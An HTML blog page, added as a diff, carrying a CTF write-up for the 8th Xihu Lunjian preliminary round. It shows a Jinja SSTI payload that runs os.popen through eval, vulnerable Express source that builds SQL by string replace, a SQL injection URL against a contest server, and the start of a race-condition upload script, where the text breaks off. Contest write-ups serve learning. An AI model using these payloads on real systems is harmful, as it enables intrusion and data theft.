@@ -1,0 +1,1486 @@
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  第八届西湖论剑 初赛 | Ya1orin
+</title>
+<meta name="description" content="第八届西湖论剑 初赛 WriteUp By 金石滩小鲨鱼"/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"http://localhost:1313/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"LanguageName\":\"English\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false},{\"Lang\":\"zh-cn\",\"LanguageName\":\"简体中文\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="第八届西湖论剑 初赛 | Ya1orin" />
+  <meta
+    property="og:description"
+    content="第八届西湖论剑 初赛 WriteUp By 金石滩小鲨鱼"
+  />
+  <meta property="og:url" content="http://localhost:1313/post/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E5%88%9D%E8%B5%9B/" />
+  <meta
+    property="og:site_name"
+    content="Ya1orin"
+  />
+  <meta
+    property="og:image"
+    content="/"
+  />
+  <meta property="article:author" content="Ya1orin" />
+  <meta property="article:published_time" content="2025-03-03T15:34:57&#43;08:00" />
+  <meta property="article:modified_time" content="2025-11-11T14:54:58&#43;08:00" /><meta property="article:tag" content="CTF" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
+    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css"
+    integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr/Io" crossorigin="anonymous"/><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+本文章没有找到对应的语言版本
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">首页</span>
+      </a><a class="main-nav-link-wrap" href="/archives">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">归档</span>
+      </a><a class="main-nav-link-wrap" href="/about">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">关于</span>
+      </a><a class="main-nav-link-wrap" href="/friend">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">友链</span>
+      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"><a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a></nav><nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">简体中文</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages"><li data-value="en" role="option" arial-selected="false" >English</li><li data-value="zh-cn" role="option" class="selected" arial-selected="true" >简体中文</li></ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            if (item.dataset.value === 'zh-cn') {
+              return;
+            }
+            if (!langMap[item.dataset.value]) {
+              _$("#lang-tooltip").style.opacity = "1";
+              setTimeout(() => {
+                _$("#lang-tooltip").style.opacity = "0";
+              }, 1000);
+              return;
+            }
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav></div>
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="第八届西湖论剑 初赛"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">第八届西湖论剑 初赛</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          class="sidebar-left"
+            ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#签到">签到</a>
+      <ul>
+        <li><a href="#欢迎来到第八届西湖论剑大赛">欢迎来到第八届西湖论剑大赛</a></li>
+      </ul>
+    </li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#rank-l">Rank-l</a></li>
+        <li><a href="#sqli-or-not">sqli or not</a></li>
+        <li><a href="#rank-u">Rank-U</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse">Reverse</a></li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#vpwn">Vpwn</a></li>
+        <li><a href="#heavens-door">Heaven&rsquo;s door</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto">Crypto</a>
+      <ul>
+        <li><a href="#matrixrsa">matrixRSA</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#糟糕的磁盘">糟糕的磁盘</a></li>
+      </ul>
+    </li>
+    <li><a href="#iot">IoT</a>
+      <ul>
+        <li><a href="#blink">blink</a></li>
+        <li><a href="#sharkp">sharkp</a></li>
+      </ul>
+    </li>
+    <li><a href="#ds">DS</a>
+      <ul>
+        <li><a href="#easydatalog">easydatalog</a></li>
+        <li><a href="#dsasignaturedata">DSASignatureData</a></li>
+        <li><a href="#easyrawencode">easyrawencode</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2025-03-03 15:34:57 &#43;0800 CST" itemprop="datePublished"
+      >2025-03-03</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-11-11</time
+    >
+  </span></div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/writeup"
+      data-aos="zoom-in"
+      >WRITEUP</a
+    ></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="签到">
+<a class="header-anchor" href="#%e7%ad%be%e5%88%b0"></a>
+签到
+</h1><h2 id="欢迎来到第八届西湖论剑大赛">
+<a class="header-anchor" href="#%e6%ac%a2%e8%bf%8e%e6%9d%a5%e5%88%b0%e7%ac%ac%e5%85%ab%e5%b1%8a%e8%a5%bf%e6%b9%96%e8%ae%ba%e5%89%91%e5%a4%a7%e8%b5%9b"></a>
+欢迎来到第八届西湖论剑大赛
+</h2><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1737190075599-b137fd66-74ff-44b3-91f2-ad15b3bab32d.png" alt="img"></p>
+<h1 id="web">
+<a class="header-anchor" href="#web"></a>
+Web
+</h1><h2 id="rank-l">
+<a class="header-anchor" href="#rank-l"></a>
+Rank-l
+</h2><p>但测试后存在部分过滤，随便上网找现成的 payload 打一下，发现能用。</p>
+<p><a href="https://tttang.com/archive/1698/#toc_payload">https://tttang.com/archive/1698/#toc_payload</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303153932439-1141025691.png" alt="image-20250303153928170"></p>
+<p>先看源码，发现黑名单</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303153943287-2103488790.png" alt="image-20250303153938985"></p>
+<p>Unicode 编码绕过即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303153948816-1789841801.png" alt="image-20250303153944618"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303153954142-242207623.png" alt="image-20250303153949897"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;head+</span><span class="se">\u002f\u0066\u006c\u0061\u0067\u0066\u0031\u0034\u0039</span><span class="s2">&#39;).read()&#34;</span><span class="p">)}}</span>
+</span></span></code></pre></div><h2 id="sqli-or-not">
+<a class="header-anchor" href="#sqli-or-not"></a>
+sqli or not
+</h2><p>给了源码，下面测试一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span> <span class="c1">// 需要创建 express 实例
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">router</span> <span class="o">=</span> <span class="nx">express</span><span class="p">.</span><span class="nx">Router</span><span class="p">();</span> <span class="c1">// 创建路由实例
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">info</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">url</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/\,/ig</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;hacker1!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">info</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">info</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Received info:&#39;</span><span class="p">,</span> <span class="nx">info</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">info</span><span class="p">.</span><span class="nx">username</span> <span class="o">&amp;&amp;</span> <span class="nx">info</span><span class="p">.</span><span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">info</span><span class="p">.</span><span class="nx">username</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="kd">var</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">info</span><span class="p">.</span><span class="nx">password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">info</span><span class="p">.</span><span class="nx">username</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/\&#39;|\&#34;|\\/</span><span class="p">)</span> <span class="o">||</span> <span class="nx">info</span><span class="p">.</span><span class="nx">password</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/\&#39;|\&#34;|\\/</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;hacker2!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="kd">var</span> <span class="nx">sql</span> <span class="o">=</span> <span class="s2">&#34;select * from userinfo where username = &#39;{username}&#39; and password = &#39;{password}&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">sql</span> <span class="o">=</span> <span class="nx">sql</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&#34;{username}&#34;</span><span class="p">,</span> <span class="nx">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">sql</span> <span class="o">=</span> <span class="nx">sql</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&#34;{password}&#34;</span><span class="p">,</span> <span class="nx">password</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Received sql:&#39;</span><span class="p">,</span> <span class="nx">sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="nx">connection</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="nx">sql</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">rs</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;error1&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="nx">rs</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;username or password error&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s2">&#34;please input the data&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s2">&#34;please input the data&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 绑定路由
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nx">router</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">3000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 启动服务器
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Server is running at http://localhost:</span><span class="si">${</span><span class="nx">port</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>参考一下 ctfshow 的ctfshow344 来绕过逗号</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154018125-768914369.png" alt="image-20250303154014042"></p>
+<p>接下来就是绕过<code>'&quot;</code>和 <code>\\</code></p>
+<p>搜索到</p>
+<p><a href="https://blog.finalize.ink/2020/12/08/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-babyjs%E5%A4%8D%E7%8E%B0/#0x02-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-url.parse">https://blog.finalize.ink/2020/12/08/%e7%bd%91%e9%bc%8e%e6%9d%af2020-babyjs%e5%a4%8d%e7%8e%b0/#0x02-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-url.parse</a></p>
+<p>网鼎 2020 半决的一道 js 题，使用二次编码和@前会被url解码绕过的单引号，但是他的是url.parse 函数，可惜了。</p>
+<p>之后翻看match 和 replace 函数的官方文档，发现了 replace 的一个特性：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154055077-1207226526.png" alt="image-20250303154050528"></p>
+<p>$\` 插入匹配子字符串之前的字符串片段,如果我们 username 中输入$` 的话，那么他之前的片段就是select * from userinfo where username = &lsquo;这一段，这样就可以帮助我们闭合前面的单引号了，至于后面那些只需要#全部给注释掉即可。</p>
+<p>最终 payload：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">http://139.155.126.78:18056/?info={&#34;username&#34;:&#34;$` or 1=1%23&#34;&amp;info=&#34;password&#34;:&#34;123&#34;}
+</span></span></span></code></pre></div><h2 id="rank-u">
+<a class="header-anchor" href="#rank-u"></a>
+Rank-U
+</h2><p>登录框，密码爆破之后发现密码为 admin/year2000，登陆后是文件上传，发现什么都能上传，但除图片之外其余的都会被删掉，考虑条件竞争，拷打 GPT 编写脚本得到如下内容:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">aiohttp</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">asyncio</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">BASE_URL</span> <span class="o">=</span> <span class="s2">&#34;http://139.155.126.78:22542/admin/Uploads/1f14bba00da3b75118bc8dbf8625f7d0&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">HEADERS</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">MAX_CONCURRENT_REQUESTS</span> <span class="o">=</span> <span class="mi">600</span>  <span class="c1"># 最大并发请求数</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">find_php_route</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">base_url</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;异步获取 PHP 文件列表&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">async</span> <span class="k">with</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span> <span class="k">as</span> <span class="n">response</span><span class="p">:</span>
